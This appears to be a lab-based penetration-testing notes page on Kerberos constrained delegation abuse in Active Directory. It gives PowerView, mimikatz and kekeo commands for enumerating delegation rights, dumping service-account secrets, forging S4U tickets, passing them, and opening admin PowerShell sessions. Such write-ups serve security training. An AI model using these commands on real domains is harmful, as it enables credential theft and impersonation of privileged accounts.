# Kerberos delegation

> Note that "Kerberos delegation" and "Permission delegation" are 2 different terms. When "AD delegation" is mentioned, it usually refers to "Kerberos delegation".

## Resources

1. **Constrained delegation abuse**

{% embed url="https://docs.specterops.io/ghostpack/rubeus/constrained-delegation-abuse" %}

2. **PowerShell remoting**

{% embed url="https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.5" %}

3. **PowerView**

{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" %}

4. Kerberos protocol extensions: Service for User (S4U)

{% embed url="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94" %}



## Important notice

The examples shown below uses the [kekeo](https://github.com/gentilkiwi/kekeo) tool, which is not maintained anymore and may not work as expected. However, the command examples are used to illustrate the basic workflow of the process in a lab environment ([TryHackMe exploiting AD](https://tryhackme.com/room/exploitingad) room), along with explanations based on my understanding.

[Rubeus](https://github.com/GhostPack/Rubeus) is a tool that is heavily adapted from the _kekeo_ project, and provides similar functionalities. Refer to the [kekeo/rubeus](https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking-concepts/windows-active-directory/tools/kekeo-rubeus) documentation for information on Rubeus.

## Constrained vs Unconstrained delegation

1. **Unconstrained**&#x20;

* service accounts have no limits on the delegation
* this means that they are able to access any services



2. **Constrained**&#x20;

* service accounts can only be delegated to certain specified services
* this means that they can only access certain controlled services

## Constrained Delegation Exploitation steps

### Overview of attack

1. Enumerate the available delegations (PowerSploit `Get-NetUser` cmdlet)

* Delegation permissions can be seen from the `msDS-AllowedToDelegateTo` property



2. Retrieve the credentials of the service account (with constrained delegation permission)

* eg. run mimikatz `lsadump::secrets` as an administrator, etc.



3. We can use the credentials obtained to request for a _Ticket Granting Ticket_ (**TGT**) as the service account user: **kekeo** `tgt::ask`&#x20;

* The newly created **TGT** can be used to request for a _Ticket Granting Service_ (**TGS**) on behalf of a specified user ([Service for User (S4U](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/3bff5864-8135-400e-bdd9-33b552051d94))): **kekeo** `tgs::s4u`&#x20;

> This is possible due to the Kerberos protocol extension: Service for User and Constrained Delegation protocol that allows an application to obtain a Kerberos service ticket on behalf of a user.&#x20;

This means that we can use the **TGT** for a service account to request for a valid **TGS** for _**ANY**_ user account of our choice, as long as the service account has the proper delegation permission for the service in question (service should be listed in the service account's `msDS-AllowedToDelegateTo` property).

Effectively, this means that once we have stolen the password for a service account (with permission delegations to a particular service), we can create a **TGS** for _**ANY**_ user of our choice, and gain access to that service.&#x20;

If the service is of high value, this can lead to impersonation of high-privilege accounts and potentially lead to full domain compromise.



4. Now that we have obtained the **TGS** for our desired user account and service, we can perform a Pass-the-Ticket attack using the mimikatz `kerberos::ptt` tool, and gain access to that particular service as the specified user.

### General example

#### Step 1

Given that we have breached a machine and gained administrative access, we can first try to enumerate available delegations. To achieve this, we can use the `Get-NetUser` cmdlets from [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1):&#x20;

```powershell
PS C:\> Import-Module C:\dir\to\PowerSploit\PowerView.ps1
PS C:\> Get-NetUser -TrustedToAuth
```

#### Step 2

Next, we can use **mimikatz** to dump the secrets of the service account (given that there is a service currently running on the host as that particular service account):

```powershell
mimikatz # token::elevate
mimikatz # lsadump::secrets
```

#### Step 3

Now that we have the secret (password), we can use it to retrieve the _Ticket Granting Ticket_ (TGT) as the service account. Subsequently, we can generate the _Ticket Granting Service_ (TGS) for a particular user account and service that our identified service account (step 1) can delegate.

> Note that we will first retrieve the **TGT** as the service account, which will be used in the subsequent **TGS** request to retrieve the **TGS** for a user of our choice â€” administrator account, etc.

{% code overflow="wrap" %}
```powershell
kekeo # tgt::ask /user:<service_account> /domain:<domain> /password:<password>
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
kekeo # tgs::s4u /tgt:<path_to_TGT> /user:<username> /service:<servicename>
```
{% endcode %}

#### Step 4

Now that we have retrieved the _Ticket Granting Service_ (TGS) for our user of choice and desired service, we can use it to perform a _Pass-the-Ticket_ attack. This will allow us to authenticate to the service we have identified earlier.

{% code overflow="wrap" %}
```powershell
mimikatz # privilege debug
mimikatz # kerberos::ptt ...
mimikatz # exit
```
{% endcode %}

### Example: exploiting PowerShell remoting

According to the [TryHackMe exploiting AD](https://tryhackme.com/room/exploitingad) room, [PowerShell remoting](https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.5) uses the HTTP and WSMAN services as well. This means that we can use the TGT we have retrieved to create TGS for both HTTP and WSMAN, before performing a _Pass-the-Ticket_ attack, which will allow us to gain a remote session on a target machine.

{% code overflow="wrap" %}
```powershell
PS> Get-Netuser -TrustedToAuth
...
userprincipalname        : svcIIS@za.tryhackme.loc                          
name                     : IIS Server   
...
msds-allowedtodelegateto : {WSMAN/THMSERVER1.za.tryhackme.loc, WSMAN/THMSERVER1, http/THMSERVER1.za.tryhackme.loc, http/THMSERVER1}
...
```
{% endcode %}

> Note that we have to generate the TGS for both the HTTP and WSMAN services

{% code overflow="wrap" %}
```powershell
kekeo # tgs::s4u /tgt:<path_to_TGT> /user:<username> /service:http/<target>
Ticket in file 'TGS_http_xxxx'

kekeo # tgs::s4u /tgt:<path_to_TGT> /user:<username> /service:wsman/<target>
Ticket in file 'TGS_wsman_xxxx'
```
{% endcode %}

Perform _Pass-the-Ticket_ with the newly created TGS:

```powershell
mimikatz # kerberos::ptt TGS_http_xxxx
mimikatz # kerberos::ptt TGS_wsman_xxx

mimikatz # exit
```

> Refer to the "PowerShell remoting" resource in the Resources section above

Given that we generate a TGS (**kekeo**) as a user that is an administrator on our target machine, we will now have administrative access.

{% code overflow="wrap" %}
```powershell
PS C:\> New-PSSession -ComputerName <computer_name>
...

PS C:\> Enter-PSSession -ComputerName <computer_name>
[xxxx]: PS C:\Users\<username> whoami
user_xxx
```
{% endcode %}

